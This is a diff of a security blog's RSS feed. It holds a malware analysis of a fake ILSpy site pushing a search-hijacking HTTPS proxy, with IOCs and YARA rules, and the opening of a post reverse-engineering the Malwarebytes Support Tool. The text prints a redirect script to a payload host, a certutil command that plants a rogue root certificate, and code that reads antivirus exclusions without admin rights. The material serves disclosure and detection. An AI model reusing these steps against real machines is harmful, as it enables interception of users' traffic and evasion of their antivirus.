+<p>I haven't reported this to Malwarebytes. Past experience with their bug bounty hasn't been great, and the debug interface has been sitting in the production build long enough that someone there presumably knows about it.</p>]]></content:encoded>
+    </item>
+    <item>
+      <title>Fake ILSpy Site Delivers Search-Hijacking Malware</title>
+      <link>https://msil.re/posts/fake-ilspy-site-search-hijacker.html</link>
+      <guid isPermaLink="true">https://msil.re/posts/fake-ilspy-site-search-hijacker.html</guid>
+      <pubDate>Tue, 07 Apr 2026 00:00:00 +0000</pubDate>
+      <category>malware-analysis</category>
+      <category>https-mitm</category>
+      <category>iocs</category>
+      <description>A 4-month-old typosquat campaign on ilspy.org delivers a trojanized PDF tool that installs a local HTTPS interception proxy and hijacks search traffic across every major engine.</description>
+      <content:encoded><![CDATA[<h2 id="overview">Overview</h2>
+<p>Someone registered <strong>ilspy.org</strong> (the real site is <strong>ilspy.net</strong>) and is using it to push malware at .NET developers and security researchers via a Traffic Distribution System (TDS). The network rotates payloads, so you might get a different app/browser extension.</p>
+<p>This post covers one downloaded payload: a trojanized PDF tool called PDF Lab that installs a local HTTPS interception proxy and silently hijacking search traffic across virtually every major search engine.</p>
+<h2 id="infection-chain">Infection Chain</h2>
+<h3 id="typosquat-landing-page">Typosquat Landing Page</h3>
+<p>The campaign starts at ilspy.org, a fake site impersonating the ILSpy project. It currently appears as the second search result for the keyword "ILSpy"</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103512.png" alt="" loading="lazy"></figure>
+<p>The real <strong>ilspy.net</strong> simply redirects to the project's GitHub page, ilspy.org instead hosts a standalone website pretending to be the official one. Any click anywhere on the page triggers a redirect, no specific button needs to be pressed.</p>
+<p>According to the Wayback Machine, the site was already active by December 9, 2025, giving this campaign at least a 4 month run at time of writing.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103526.png" alt="" loading="lazy"></figure>
+<h3 id="redirect-via-traffic-distribution-system">Redirect via Traffic Distribution System</h3>
+<p>The victim is redirected to an intermediate domain, which acts as a Traffic Distribution System (TDS). This gateway infrastructure has rotated across multiple domains over the campaign's lifetime, based on Wayback Machine snapshots of <strong>ilspy.org</strong>:</p>
+<div class="table-wrap"><table><thead><tr><th>Domains</th></tr></thead><tbody><tr><td>oundhertobeconsist.org</td></tr><tr><td>unpracticalwhich.org</td></tr><tr><td>derwaistthatheha.org</td></tr><tr><td>edshookherhead.org</td></tr><tr><td>atytentioniaukmla.org</td></tr><tr><td>bycathyhoughsheu.org</td></tr><tr><td>sehinkitwkuou.org</td></tr><tr><td>onalskillsexkce.org</td></tr></tbody></table></div>
+<p>All share the same pattern: a random-looking <code>.org</code> domain serving nothing but a JavaScript redirect.</p>
+<pre class="language-html"><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;
+  &lt;script type=&quot;text/javascript&quot;&gt;
+    window.location.href = &quot;https://blazingapss8.cfd/app/9/?clickid=8363797469683014935&amp;filename=&quot;;
+  &lt;/script&gt;
+&lt;/head&gt;
+&lt;/html&gt;
+</code></pre>
+<h3 id="malware-download">Malware Download</h3>
+<p>The final payload is downloaded from:</p>
+<pre class="language-none"><code class="language-none">https://blazingapss8.cfd/app/9/?clickid=8363797469683014935&amp;filename=
+</code></pre>
+<p>The installer (App.exe) drops a bunch of files:</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103608.png" alt="" loading="lazy"></figure>
+<p>From all these files, there are two that we will take a look at:</p>
+<div class="table-wrap"><table><thead><tr><th>File</th><th>Purpose</th></tr></thead><tbody><tr><td>PDFLabApp.dll</td><td>Trojanized PDF tool</td></tr><tr><td>PDFLabWatchdog.dll</td><td>Evidence cleanup / anti-forensics watchdog</td></tr></tbody></table></div>
+<h2 id="technical-analysis">Technical Analysis</h2>
+<h3 id="appexe">App.exe</h3>
+<p><code>App.exe</code> is an Inno Setup installer, beyond dropping the main components and all necessary libraries, it handles three things silently in the background while the victim sees a normal installation flow:</p>
+<ul><li>Installs <strong>.NET Desktop Runtime 7.0.20</strong> with <code>/quiet /norestart</code></li><li>Imports <code>rootCert.pfx</code> into the Windows trusted root certificate store using <code>certutil.exe</code></li><li><code>certutil.exe&quot; -f -p &quot;&quot; -importPFX Root &quot;C:\Program Files (x86)\PDF Lab\rootCert.pfx</code></li><li>Writes both Run keys for persistence</li><li><code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\PDFLabWatchdog</code></li><li><code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\PDFLab</code></li></ul>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103621.png" alt="" loading="lazy"></figure>
+<h3 id="pdflabappdll">PDFLabApp.dll</h3>
+<p>The malware installs a functional PDF utility called PDF Lab.</p>
+<p>The application presents a real UI with working features including Merge PDF, Split PDF, Compress PDF, and Protect PDF.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103640.png" alt="" loading="lazy"></figure>
+<h4 id="remote-kill-switch-and-telemetry">Remote Kill Switch and Telemetry</h4>
+<p>The main entry point uses a named mutex (<code>GoogleSearchRedirect_SingleInstance</code>) to enforce a single running instance. More significantly, it implements a <strong>run counter</strong>: every 10th launch, it connects to a hardcoded SQL Server instance at <code>216.219.86.206</code> before allowing the application to proceed.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103651.png" alt="" loading="lazy"></figure>
+<p>Two operations are run against this remote database:</p>
+<p>The first looks like a <strong>kill switch check</strong>. It queries the <code>AppRunState</code> table for a <code>KeepAppRunning</code> boolean. If this is set to false, the application exits immediately</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103703.png" alt="" loading="lazy"></figure>
+<p>The second is <strong>telemetry.</strong> It updates <code>AppInstances</code>, incrementing a <code>LifetimeInstanceCount</code> and recording the last <code>StartupTime</code>.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103710.png" alt="" loading="lazy"></figure>
+<p>The database credentials are hardcoded in the binary in plaintext:</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103715.png" alt="" loading="lazy"></figure>
+<h4 id="https-interception-proxy">HTTPS Interception Proxy</h4>
+<p>The most significant component is an HTTPS man-in-the-middle proxy built using the <strong>Titanium.Web.Proxy</strong> library, listening on <strong>localhost:18234</strong>. This is what performs the actual search hijacking.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103738.png" alt="" loading="lazy"></figure>
+<p>With the root certificate already installed by the installer, the proxy can decrypt and manipulate HTTPS traffic without warnings. The malware changes Windows system proxy settings to route all browser traffic through it, saving the victim's original proxy configuration first for cleanup later.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103746.png" alt="" loading="lazy"></figure>
+<h4 id="search-engine-coverage">Search Engine Coverage</h4>
+<p>The proxy intercepts search queries across an exhaustive list of search engines, covering virtually every major platform and every regional Google TLD worldwide:</p>
+<ul><li><strong>Western engines:</strong> Google (191 TLDs), Bing, Yahoo, DuckDuckGo, Brave, Startpage, Ecosia, AOL, Ask</li><li><strong>Eastern engines:</strong> Yandex, Baidu, Naver, Sogou</li><li><strong>Plus all regional Google domains</strong> from google.ad to google.co.zw</li></ul>
+<p>Any search query matching these patterns is intercepted and redirected to <code>pdflab.gg/search</code>, which in turn forwards the victim to <code>doktox.com</code>, a  search engine branded as "Blaze".</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103758.png" alt="" loading="lazy"></figure>
+<p>For example, a search for "ilspy decompiler" gets redirected to:</p>
+<p><code>https://pdflab.gg/search?q=ilspy+decompiler</code> which then redirects the victim to <code>https://doktox.com/q/pdflab?q=ilspy+decompiler</code></p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103804.png" alt="" loading="lazy"></figure>
+<h3 id="pdflabwatchdogdll">PDFLabWatchdog.dll</h3>
+<p>The watchdog process serves two purposes: <strong>evidence cleanup</strong> and <strong>anti-forensics</strong>.</p>
+<p>Sleeps for 120 seconds and then every 5 seconds it checks two conditions:</p>
+<ol><li>Is <code>PDFLabApp.exe</code> currently running?</li><li>Is the Windows proxy currently set to port 18234?</li></ol>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103818.png" alt="" loading="lazy"></figure>
+<p>If PDFLabApp is <strong>not</strong> running but the malicious proxy is <strong>still configured</strong>, it restores the victim's original proxy settings from <code>HKCU\Software\GoogleSearchRedirect\OriginalProxy</code> and then <strong>deletes the entire</strong> <code>GoogleSearchRedirect</code> registry subtree.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103824.png" alt="" loading="lazy"></figure>
+<h4 id="anti-debug-and-anti-profiling-module">Anti-Debug and Anti-Profiling Module</h4>
+<ul><li><strong>Profiler detection:</strong> If the <code>COR_ENABLE_PROFILING</code> environment variable equals <code>1</code> (set by .NET profiling tools), <code>Environment.FailFast()</code> is called immediately.</li><li><strong>Debugger watchdog:</strong> A background thread polls <code>Debugger.IsAttached</code> and <code>Debugger.IsLogging()</code> in a loop. Either condition triggers an immediate hard crash.</li><li><strong>Mutual watchdog:</strong> The main thread and the monitor thread watch each other. Killing the monitor thread causes the process to crash too, preventing simple thread termination as a bypass.</li></ul>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103833.png" alt="" loading="lazy"></figure>
+<h2 id="pdb-path-and-github-repository">PDB Path and GitHub Repository</h2>
+<p>The binary contains an embedded PDB record that was not stripped before distribution, leaking both the developer's local path and a raw GitHub URL pointing to the source:</p>
+<pre class="language-json"><code class="language-json">{&quot;documents&quot;:{&quot;D:\\Dev\\PDFLab\\PDFLabAppWithProxy\\*&quot;:
+&quot;https://raw.githubusercontent.com/OmarNegm/PDFLabApp/9fa6add51f24128df6706dce5c426fbe1b7015f0/*&quot;}}
+</code></pre>
+<h2 id="iocs">IOCs</h2>
+<div class="table-wrap"><table><thead><tr><th>Network IOCs</th></tr></thead><tbody><tr><td><code>ilspy.org</code></td></tr><tr><td><code>oundhertobeconsist.org</code></td></tr><tr><td><code>unpracticalwhich.org</code></td></tr><tr><td><code>edshookherhead.org</code></td></tr><tr><td><code>derwaistthatheha.org</code></td></tr><tr><td><code>bycathyhoughsheu.org</code></td></tr><tr><td><code>atytentioniaukmla.org</code></td></tr><tr><td><code>sehinkitwkuou.org</code></td></tr><tr><td><code>onalskillsexkce.org</code></td></tr><tr><td><code>blazingapss8.cfd</code></td></tr><tr><td><code>pdflab.gg</code></td></tr><tr><td><code>doktox.com</code></td></tr><tr><td><code>ghabovethec.info</code></td></tr><tr><td><code>usoasopersbefore.org</code></td></tr><tr><td><code>216.219.86.206</code></td></tr><tr><td><code>wasgiwiththinleld.org</code></td></tr></tbody></table></div>
+<div class="table-wrap"><table><thead><tr><th>File IOCs</th><th>SHA-256</th></tr></thead><tbody><tr><td><code>PDFLabApp.exe</code></td><td><code>059EFA4D73EC27AC904189FCE83C1CCF21F3CE565A5359D01C16C6E87E8D40A2</code></td></tr><tr><td><code>PDFLabApp.dll</code></td><td><code>05E6BB6890E4FBE2EA0DF5653CF6CBD2AAEE46E9C3DC69A020FD445ACF650D46</code></td></tr><tr><td><code>App.exe</code></td><td><code>5AE5235F7622A7B6E0E89DCE8B3C0A9A34DDB8C8C87306963FE4D4095F5D443C</code></td></tr><tr><td><code>rootCert.pfx</code></td><td><code>6A6CB2ED1214D91216900E3A3C585D56065997FC56944E45A43ED6BAC51E3237</code></td></tr><tr><td><code>PDFLabWatchdog.exe</code></td><td><code>A5C7333AFCC64C2D259C369407C0E33874FCB1989B99855BBD4CDC55EA6EAF8E</code></td></tr><tr><td><code>PDFLabWatchdog.dll</code></td><td><code>86D10F7D2078C4E3DD3806E28537F1220F3E3F451322FB70EDEA3C760D2C78FE</code></td></tr><tr><td><code>App.tmp</code></td><td><code>339CD77996AF82A614DA6C9441A17AC1A5FE3172E270AAA99C9AAE24716E3EAC</code></td></tr></tbody></table></div>
+<div class="table-wrap"><table><thead><tr><th>Registry IOCs</th></tr></thead><tbody><tr><td><code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\PDFLab</code></td></tr><tr><td><code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\PDFLabWatchdog</code></td></tr><tr><td><code>HKCU\Software\GoogleSearchRedirect</code></td></tr><tr><td><code>HKCU\Software\GoogleSearchRedirect\OriginalProxy</code></td></tr></tbody></table></div>
+<h3 id="yara-rules">YARA Rules</h3>
+<pre class="language-json"><code class="language-json">rule pdflabapp
+{
+    meta:
+        author = &quot;miltinh0c&quot;
+        date = &quot;2026-04-07&quot;
+        description = &quot;Detects the HTTPS proxy search hijacker used in PDFLabApp.&quot;
+    strings:
+        $search_redirect_url = &quot;pdflab.gg/search&quot; ascii wide
 
-<aside class="toc" aria-label="On this page">
-  <h4 class="toc-title">On this page</h4>
-  <nav class="toc-nav">
-<a class="toc-h2" href="#how-this-started">How this started</a><a class="toc-h2" href="#a-quick-detour-source-maps-and-readable-code">A quick detour: source maps and readable code</a><a class="toc-h2" href="#whats-covered">What&#x27;s covered</a><a class="toc-h2" href="#1-locating-the-extension-files">1. Locating the extension files</a><a class="toc-h2" href="#2-identifying-the-compression-format">2. Identifying the compression format</a><a class="toc-h2" href="#3-bloom-filters">3. Bloom filters</a><a class="toc-h3" href="#structure">Structure</a><a class="toc-h3" href="#hashing">Hashing</a><a class="toc-h3" href="#categories">Categories</a><a class="toc-h3" href="#reproducing-the-filter-in-c">Reproducing the filter in C\#</a><a class="toc-h2" href="#4-manifest-declared-rules">4. Manifest-declared rules</a><a class="toc-h2" href="#5-heuristic-rules">5. Heuristic rules</a><a class="toc-h3" href="#dom-scanning">DOM Scanning</a><a class="toc-h3" href="#how-matches-are-hidden">How matches are hidden</a><a class="toc-h3" href="#rule-format">Rule format</a><a class="toc-h3" href="#separator-syntax">Separator syntax</a><a class="toc-h3" href="#domain-scoping">Domain scoping</a><a class="toc-h3" href="#multi-part-rule-groups">Multi-part rule groups</a><a class="toc-h3" href="#supported-selector-operators">Supported selector operators</a><a class="toc-h3" href="#most-common-domain-scopes">Most common domain scopes</a><a class="toc-h3" href="#small-heuristics-engine-in-python">Small Heuristics engine in python</a><a class="toc-h2" href="#6-what-the-rules-are-targeting">6. What the rules are targeting</a><a class="toc-h3" href="#brand-title-impersonation">Brand / Title impersonation</a><a class="toc-h3" href="#email-webmail-account-phish">Email / Webmail / Account phish</a><a class="toc-h3" href="#crypto-related">Crypto related</a><a class="toc-h3" href="#script-content-signatures">Script-content signatures</a><a class="toc-h3" href="#scam-fake-alert-fake-verification-text">Scam / Fake-alert / Fake-verification text</a><a class="toc-h2" href="#7-malware-rules">7. Malware rules</a><a class="toc-h3" href="#typosquatting-detection">Typosquatting detection</a><a class="toc-h2" href="#8-false-positive-prevention-via-hubble">8. False positive prevention via Hubble</a><a class="toc-h3" href="#hubble-request">Hubble Request</a><a class="toc-h3" href="#the-jwt-and-the-obfuscated-keys">The JWT and the obfuscated keys</a><a class="toc-h3" href="#a-minimal-hubble-client-in-c">A minimal Hubble client in C\#</a><a class="toc-h2" href="#9-download-classification">9. Download classification</a><a class="toc-h3" href="#file-extension-classification">File extension classification</a><a class="toc-h3" href="#mime-based-detection">MIME-based detection</a><a class="toc-h3" href="#risk-based-tld-scoring">Risk-based TLD scoring</a><a class="toc-h3" href="#url-pattern-matching">URL pattern matching</a><a class="toc-h3" href="#named-campaign-patterns">Named campaign patterns</a><a class="toc-h3" href="#cdn-allowlist">CDN allowlist</a><a class="toc-h3" href="#false-positive-suppression">False positive suppression</a><a class="toc-h3" href="#pe-header-detection">PE header detection</a><a class="toc-h2" href="#10-tech-support-scam-and-browser-locker-detection">10. Tech support scam and browser locker detection</a><a class="toc-h3" href="#browser-locker-detection">Browser locker detection</a><a class="toc-h3" href="#content-script-detectors">Content script detectors</a><a class="toc-h3" href="#skimmer-protection-injection">Skimmer protection injection</a><a class="toc-h3" href="#beforeunload-suppression">beforeunload suppression</a><a class="toc-h2" href="#11-shell-injection-and-clickfix-detection">11. Shell injection and ClickFix detection</a><a class="toc-h3" href="#clipboard-payload-heuristics">Clipboard Payload Heuristics</a><a class="toc-h3" href="#triggering-the-popup">Triggering the popup</a><a class="toc-h3" href="#suppressing-it-with-a-mutationobserver">Suppressing it with a MutationObserver</a><a class="toc-h3" href="#full-detection-patterns">Full Detection Patterns</a><a class="toc-h2" href="#12-update-mechanism">12. Update mechanism</a><a class="toc-h3" href="#manifest-endpoint">Manifest endpoint</a><a class="toc-h3" href="#request-body">Request body</a><a class="toc-h3" href="#response">Response</a><a class="toc-h3" href="#a-minimal-client-in-c">A minimal client in C\#</a><a class="toc-h2" href="#13-hidden-debug-url-backdoor">13. Hidden debug URL backdoor</a><a class="toc-h3" href="#how-the-dispatch-works">How the dispatch works</a><a class="toc-h3" href="#what-you-can-do-with-it">What you can do with it</a><a class="toc-h3" href="#disabling-heuristics">Disabling heuristics</a><a class="toc-h3" href="#weaponizing">Weaponizing</a><a class="toc-h2" href="#conclusion">Conclusion</a>
-  </nav>
-</aside>
+        $root_cert_name = &quot;Titanium Root Certificate Authority&quot; ascii wide
+        $library_titanium = &quot;Titanium.Web.Proxy&quot; ascii wide
 
-</main>
-<footer class="site-footer">
-  <div class="wrap">
-    <nav class="socials" aria-label="Social links">
-      <a href="https://x.com/miltinh0c" target="_blank" rel="noopener noreferrer" aria-label="X (Twitter)">
-        <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
-      </a>
-      <a href="https://github.com/miltinhoc" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
-        <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill="currentColor" d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
-      </a>
-      <a href="https://www.linkedin.com/in/miltonamcardoso/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn">
-        <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill="currentColor" d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.063 2.063 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
-      </a>
-      <a href="../feed.xml" aria-label="RSS feed">
-        <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill="currentColor" d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415c1.814 0 3.293 1.479 3.293 3.295 0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526 0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727 0 15.909 7.184 15.909 15.91z"/></svg>
-      </a>
-    </nav>
-  </div>
-</footer>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/toolbar/prism-toolbar.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/show-language/prism-show-language.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js"></script>
-<script>
-(function () {
-  var links = document.querySelectorAll('.toc a');
-  if (!links.length) return;
-  var map = new Map();
-  links.forEach(function (a) {
-    var id = a.getAttribute('href').slice(1);
-    var el = document.getElementById(id);
-    if (el) map.set(el, a);
-  });
-  var io = new IntersectionObserver(function (entries) {
-    entries.forEach(function (entry) {
-      var link = map.get(entry.target);
-      if (!link) return;
-      if (entry.isIntersecting) {
-        links.forEach(function (l) { l.classList.remove('active'); });
-        link.classList.add('active');
-      }
-    });
-  }, { rootMargin: '-80px 0px -70% 0px', threshold: 0 });
-  map.forEach(function (_, el) { io.observe(el); });
-})();
-</script>
-</body>
-</html>
+        $reg_google_redirect_key = &quot;Software\\GoogleSearchRedirect&quot; ascii wide
+        $reg_internet_settings = &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot; ascii wide
+
+        $zero_width_space = { E2 80 8B }
+        $zero_width_nonjoiner = { E2 80 8C }
+    condition:
+        uint16(0) == 0x5A4D
+        and $root_cert_name
+        and $reg_google_redirect_key
+        and $reg_internet_settings
+        and $search_redirect_url
+        and $library_titanium
+        and 1 of ($zero_width_space, $zero_width_nonjoiner)
+}
+</code></pre>
+<pre class="language-json"><code class="language-json">rule pdflabapp_watchdog
+{
+    meta:
+        author = &quot;miltinh0c&quot;
+        date = &quot;2026-04-07&quot;
+        description = &quot;Detects the PDFLabWatchdog cleanup process.&quot;
+    strings:
+        $process = &quot;PDFLabApp&quot; ascii wide
+
+        $reg_google_redirect_key = &quot;Software\\GoogleSearchRedirect&quot; ascii wide
+        $reg_original = &quot;Software\\GoogleSearchRedirect\\OriginalProxy&quot; ascii wide
+        $reg_internet_settings = &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot; ascii wide
+
+        $proxy_enable = &quot;ProxyEnable&quot; ascii wide
+        $proxy_server = &quot;ProxyServer&quot; ascii wide
+        $proxy_override = &quot;ProxyOverride&quot; ascii wide
+
+        $import_winnet = &quot;wininet.dll&quot; ascii wide
+        $internet_set_option = &quot;InternetSetOption&quot; ascii wide
+
+        $zero_width_space = { E2 80 8B }
+        $zero_width_nonjoiner = { E2 80 8C }
+    condition:
+        uint16(0) == 0x5A4D
+        and $process
+        and $reg_google_redirect_key
+        and $reg_internet_settings
+        and $import_winnet
+        and $internet_set_option
+        and 2 of ($proxy_enable, $proxy_server, $proxy_override, $reg_original)
+        and 1 of ($zero_width_space, $zero_width_nonjoiner)
+}
+</code></pre>]]></content:encoded>
+    </item>
+    <item>
+      <title>Digging Into Malwarebytes Support Tool</title>
+      <link>https://msil.re/posts/digging-into-malwarebytes-support-tool.html</link>
+      <guid isPermaLink="true">https://msil.re/posts/digging-into-malwarebytes-support-tool.html</guid>
+      <pubDate>Thu, 02 Oct 2025 00:00:00 +0000</pubDate>
+      <category>reverse-engineering</category>
+      <category>malwarebytes</category>
+      <category>dotnet</category>
+      <description>Reverse engineering the Malwarebytes Support Tool: reading exclusions without admin, real-time threat notification tracking via WAL forcing, silent uninstalls and a subscription unredeem path.</description>
+      <content:encoded><![CDATA[<h2 id="how-it-started">How it started</h2>
+<p>In my last post, I explored a vulnerability in Malwarebytes that let a <strong>low-privilege</strong> component trigger actions normally restricted to higher privileges. This time, I turned my attention to the <strong>Malwarebytes Support Tool</strong>.</p>
+<p>While poking around, I uncovered a few flaws and potential vulnerabilities:</p>
+<ul><li>How a <strong>low-privilege</strong> process can read the exclusions list.</li><li>How to <strong>track Malwarebytes threat notifications in real-time</strong>.</li><li>How the support tool <strong>creates tickets and can perform silent uninstalls</strong>.</li><li>How It may be possible to <strong>downgrade Malwarebytes</strong> by removing the subscription, which would disable real-time protection and leave the machine less secure.</li></ul>
+<h3 id="but-how-did-i-get-here">But how did I get here?</h3>
+<p>While testing another Malwarebytes vulnerability, I broke my installation. Instead of reinstalling it manually, I downloaded the official Support Tool.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509102651.png" alt="" loading="lazy"></figure>
+<p>That's when my .NET trained eye 🤓 started tingling, I got the sense this was made in .NET.</p>
+<p>After spotting a <code>Newtonsoft</code> DLL and some other ones, I grabbed my <strong>dotnetFinder</strong> tool and ran it against the tool's files.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509102715.png" alt="" loading="lazy"></figure>
+<h2 id="how-it-works">How it works</h2>
+<p>I started by looking at the support tool executable but didn't find anything promising, although at the end of the post we'll go back to it and check some fun things I learned.</p>
+<p>Some DLLs immediately catch the eye. we'll first take a look at the native ones, while <code>mbrpt.dll</code> will come later, as it's the only significant .NET DLL. <code>mbfix_clr.dll</code> appears to be written in managed C++, but it’s a Windows system repair utility, so it's not very interesting.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509102725.png" alt="" loading="lazy"></figure>
+<h3 id="overview-of-the-dlls">Overview of the DLLs</h3>
+<div class="table-wrap"><table><thead><tr><th>DLL</th><th>Purpose</th></tr></thead><tbody><tr><td>mbcheck.dll</td><td>Collects system information.</td></tr><tr><td>mbclean.dll</td><td>Removes Malwarebytes software.</td></tr><tr><td>mbfix\_clr.dll</td><td>Restores windows components like wmi, firewall, etc, using registry hives.</td></tr><tr><td>mbcut.dll</td><td>Common Utilities used by other DLLs.</td></tr><tr><td>mbgrab.dll</td><td>Collects files from the system.</td></tr><tr><td>mbchkrpt.dll</td><td>Collects system/malwarebytes configuration information.</td></tr><tr><td>mbrpt.dll</td><td>Bridge between the .NET application and all the other utility DLLs.</td></tr></tbody></table></div>
+<p>After examining several native DLLs, the most interesting is <code>mbcheck.dll</code>, which exposes a large number of exported functions. I would split the exports into two categories: <strong>System Information</strong> and <strong>Malwarebytes Information</strong>.</p>
+<p><strong>System information:</strong></p>
+<ul><li>Get antivirus software installed.</li><li>Get third party firewalls installed.</li><li>Get network adapters information.</li><li>Get user accounts / computer information.</li><li>Get the list of startup applications.</li><li>Get UAC configuration.</li></ul>
+<p><strong>Malwarebytes Information:</strong></p>
+<ul><li>Get protection information</li><li>Get proxy server settings</li><li>Get quarantine list</li><li>Get exclusion list</li></ul>
+<p>Now, figuring out what struct each function uses is tricky. All the functions take a pointer to a struct and then fill it accordingly. Without documentation, you have to reverse-engineer the struct's layout and fields, which can be tedious.</p>
+<p>When asking my friend estrellas (go check his blog: <a href="https://deobfuscation.club/blog/" target="_blank" rel="noopener noreferrer">https://deobfuscation.club/blog/</a>) for some plugin that could help me, i got this answer:</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509102743.png" alt="" loading="lazy"></figure>
+<p>So, for that reason, we’ll put the native DLLs to the side and take the much easier route: check the imports on the .NET DLL.</p>
+<h3 id="looking-at-the-net-dll">Looking at the .NET DLL</h3>
+<p>This brings us to <code>mbrpt.dll</code>, which the support tool executable uses to access all the functionalities provided by the other DLLs.</p>
+<p>Luckily for us, there’s no obfuscation, so the code is easy to read.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509102751.png" alt="" loading="lazy"></figure>
+<p>There's a lot to go through, so I'll focus on the native imports first. A quick search for the DLL names makes them easy to spot.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509102805.png" alt="" loading="lazy"></figure>
+<p>There is a lot of information you can get, as an example:</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509102813.png" alt="" loading="lazy"></figure>
+<p>But I'll focus on the code for getting the exclusion list, which is the most interesting one to me.</p>
+<h3 id="getting-the-exclusions-list">Getting the Exclusions list</h3>
+<p>The code for this lies in the <code>GetProtectionInfo</code> function, there is a lot of structs and classes needed, so I will keep it short here and link the full code on GitHub.</p>
+<pre class="language-csharp"><code class="language-csharp">[DllImport(&quot;mbcheck.dll&quot;, CallingConvention = CallingConvention.Cdecl)]
+[return: MarshalAs(UnmanagedType.I1)]
+
+public static bool GetProtectionInfoImp(ref ConfiguredExclusion configuredExclusion, PROTECTION_TYPE type)
+{
+    try
+    {
+        PROTECTION_INFO protectionInfo = default(PROTECTION_INFO);
+        if (GetProtectionInfo(ref protectionInfo, type))
+        {
+            switch (type)
+            {
+                case PROTECTION_TYPE.ANTI_EXPLOIT:
+                    configuredExclusion.aeExclusion.ProtectionState = protectionInfo.ProtectionState;
+                    break;
+                case PROTECTION_TYPE.ANTI_RANSOMWARE:
+                    configuredExclusion.arwExclusion.ProtectionState = protectionInfo.ProtectionState;
+                    break;
+                case PROTECTION_TYPE.MALWARE:
+                    configuredExclusion.malwareExclusion.ProtectionState = protectionInfo.ProtectionState;
+                    break;
+                case PROTECTION_TYPE.WEB:
+                    configuredExclusion.mwacExclusion.ProtectionState = protectionInfo.ProtectionState;
+                    break;
+            }
